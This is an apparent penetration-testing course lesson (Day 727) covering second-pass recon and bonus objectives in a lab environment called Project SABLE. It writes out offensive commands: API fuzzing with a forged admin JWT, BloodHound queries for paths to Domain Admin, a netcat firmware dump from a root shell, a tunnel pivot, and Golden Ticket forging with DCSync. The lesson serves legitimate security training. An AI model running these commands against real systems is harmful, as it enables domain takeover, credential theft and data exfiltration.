---
title: "Ghost Level Extended — Day 1: Bonus Objectives and Second-Pass Recon"
tags: [ghost-level, extended-engagement, second-pass, bonus-objectives,
  module-11-ghost-level]
module: 11-GhostLevel
day: 727
prerequisites:
  - Day 726 — Ghost Level Debrief
related_topics:
  - Day 728 — Ghost Level Extended Day 2: Purple Team Exercise
  - Day 730 — Ghost Level Competency Gate
---

# Day 727 — Ghost Level Extended Day 1: Bonus Objectives and Second-Pass Recon

> "The first pass reveals what is easy to find. The second pass finds what you
> missed because you were moving fast. Every professional engagement has at
> least two passes. The first is breadth. The second is depth. Today is the
> second pass."
>
> — Ghost

---

## Goals

1. Return to the Project SABLE environment with fresh eyes and conduct a
   second-pass recon on all targets.
2. Attempt two bonus objectives that require combining findings across phases.
3. Practice the "lateral thinking" technique — approaching each target from a
   different angle than the first pass.

---

## Prerequisites

- Day 726 — Debrief complete (you know what you missed).
- Project SABLE environment still accessible.

---

## 1 — The Second-Pass Mindset

The first-pass mindset is breadth: cover every target, identify every service,
find the obvious attack surface. The second-pass mindset is different:

```
SECOND-PASS MINDSET

Ask for EACH TARGET:
  1. "If I were a defender who saw my first-pass attack, where would
     I add a control? What did I abuse that they might fix?"
  2. "What input surface did I never send a malformed packet to?"
  3. "What file or database did I find but not fully read?"
  4. "What error message did I see but not investigate?"
  5. "What service did I port-scan but not enumerate at the protocol level?"

The second pass is hypothesis-driven, not breadth-driven.
```

---

## 2 — Second-Pass Target Assignments

Complete at least 3 of the 5 second-pass tasks below:

### Task A — sable-web: Enumerate Hidden API Endpoints

During Phase 2, you exploited the JWT bypass. Now go deeper:

```bash
# Fuzz the API surface you did not enumerate in Phase 2
# Use the admin JWT you forged in Day 709

export JWT="<your_forged_admin_token>"

# Fuzz API paths with admin context
ffuf -u https://sable-web.lab/api/v1/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -H "Authorization: Bearer $JWT" \
     -mc 200,201,204,400,403,500 \
     -o api_second_pass.json

# Investigate 500 responses — often indicate vulnerable code paths
grep '"status":500' api_second_pass.json | jq .

# Also fuzz with PUT/DELETE methods on discovered endpoints
ffuf -u https://sable-web.lab/api/v1/FUZZ \
     -w api_endpoints.txt \
     -H "Authorization: Bearer $JWT" \
     -X PUT \
     -mc 200,201,400,403,500
```

**Second-pass hypothesis:** The admin API may have an `/export` or `/backup`
endpoint that triggers a server-side action with potential SSRF or path
traversal.

### Task B — sable-svc: Protocol Depth

In Phase 3 you found and exploited the stack overflow. Now:

```
PROTOCOL SECOND-PASS

Goal: Document the FULL TLV protocol command set.
You only tested message types 0x01 and 0x03. What are types 0x02, 0x04–0x0F?

Method:
  1. Reconnect to sable-svc with your custom client (Day 711)
  2. Send each message type 0x01–0x0F with a valid-size body
  3. Log the response for each — what succeeds vs. fails?
  4. For each successful type, fuzz the body field

Expected outcome: at least 1 additional bug class (command injection,
info disclosure, or second buffer overflow in a different handler)
```

### Task C — sable-dc: BloodHound Second Path

In Phase 4 you took the primary BloodHound path. Now find the secondary path:

```powershell
# Re-query BloodHound for paths you did not exploit
# In BloodHound query console:

# Query 1: All principals with unconstrained delegation
MATCH (c {unconstraineddelegation: true}) RETURN c

# Query 2: Any WriteDACL or GenericAll edges you did not use
MATCH p=shortestPath((n)-[r:WriteDACL|GenericAll*1..]->(m:Domain)) RETURN p

# Query 3: ACL-based paths to DA that bypass Kerberoasting
MATCH p=shortestPath((u:User)-[r:Owns|WriteDACL|GenericAll|GenericWrite*1..]
                              ->(g:Group {name:"DOMAIN ADMINS@SABLE.LOCAL"}))
RETURN p
```

**Goal:** Document the secondary attack path to Domain Admin and explain
which defensive control would have broken it if your primary path was blocked.

### Task D — sable-iot: Firmware Second Extraction

During Phase 5 you exploited the CGI injection. Now extract the firmware:

```bash
# Using your root shell on sable-iot via CGI injection:
# Goal: obtain a copy of the firmware without the vendor portal

# List flash partitions
cat /proc/mtd
# Expected: mtd0=bootloader, mtd1=kernel, mtd2=rootfs, mtd3=config

# Download the rootfs partition (the one you are running in):
dd if=/dev/mtd2 bs=65536 | nc -l -p 4444 &
# On attacker machine:
nc sable-iot.lab 4444 > sable-iot-rootfs.bin
binwalk sable-iot-rootfs.bin

# What credentials are hardcoded that you did NOT find via the web panel?
```

### Task E — Cross-Target: Credential Reuse Audit

Check every credential you harvested across the engagement for reuse:

```
CREDENTIAL REUSE AUDIT WORKSHEET

Credential                   | sable-web | sable-svc | sable-dc | sable-iot | sable-store
-----------------------------|-----------|-----------|----------|-----------|------------
admin:admin                  |           |           |          |           |
svc_backup:[cracked_hash]    |           |           |          |           |
(harvested from sable-store) |           |           |          |           |
(harvested from sable-iot)   |           |           |          |           |

Mark each: SSH / Web / SMB / RDP / WinRM / Other
```

---

## 3 — Bonus Objective Challenges

These challenges require combining findings across multiple phases:

### Bonus 1 — The Invisible Pivot

**Objective:** Establish a pivot to a network segment that was NOT in scope
during the primary engagement. During recon, you may have noticed an
additional subnet referenced in routing tables or ARP caches.

```bash
# On sable-svc (your post-exploitation host):
ip route
arp -a
cat /etc/hosts

# If an additional subnet appears (e.g., 10.10.30.0/24):
# Set up Ligolo-ng tunnel to enumerate it
# Use nmap to scan - what new hosts appear?
# This is the "invisible pivot" — document it as a bonus finding
```

### Bonus 2 — The Golden Ticket Persistence Proof

**Objective:** Demonstrate that your Golden Ticket (from Phase 4) persists
across a domain controller reboot, which proves that credential rotation
alone does not remediate it.

```bash
# Export your Golden Ticket to a .ccache file
ticketer.py -nthash <krbtgt_hash> \
            -domain-sid <domain_sid> \
            -domain SABLE.LOCAL \
            Administrator
export KRB5CCNAME=Administrator.ccache

# Simulate a 24-hour gap (or a DC restart in the lab):
# The KRBTGT password has NOT been rotated
# Re-run DCSync with the cached ticket:
secretsdump.py -k -no-pass dc01.sable.local

# Documented outcome: Golden Ticket valid for 10 years by default
# Remediation: KRBTGT password must be rotated TWICE within 24 hours
```

---

## 4 — Documenting Bonus Findings

For each bonus finding, add an addendum to your Phase 6 report:

```
ADDENDUM FINDING — [FINDING TITLE]

  Found during: Second-pass / Bonus objective
  Target: ______________________
  Finding type: Information disclosure / Command injection / Additional
                attack path / Persistence validation
  Severity: Critical / High / Medium / Low
  Description:
    ______________________________________________________________
  Evidence:
    ______________________________________________________________
  ATT&CK Technique: T____________________________________
  Remediation:
    ______________________________________________________________
```

---

## Key Takeaways

1. **The first pass is never complete.** Professional penetration tests bill
   for at least two passes. The deliverable is not "we scanned your systems."
   It is "we understand your attack surface at sufficient depth to find the
   vulnerabilities an attacker would find with one to two weeks of work."
2. **Protocol depth produces second findings.** Any network service with a
   message-type dispatch table has at least N handlers. If you only fuzz one
   message type, you have tested 1/N of the attack surface. The second pass
   covers the rest.
3. **Credential reuse is the most common lateral movement vector in real
   engagements.** Before spending hours on a complex technique, spend 5 minutes
   trying every credential you already have on every service you have
   not tried. The hit rate is higher than most beginners expect.
4. **Bonus objectives compound the narrative.** A report that demonstrates
   both initial exploitation AND persistence AND the gap between remediation
   and full recovery (Golden Ticket lifetime) tells the client a complete story.
   That story is worth more than any single finding.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q727.1, Q727.2 …).

---

## Navigation

← Previous: [Day 726 — Ghost Level Debrief](DAY-0726-Ghost-Level-Debrief.md)
→ Next: [Day 728 — Ghost Level Extended Day 2: Purple Team Exercise](DAY-0728-Ghost-Level-Extended-Day2.md)
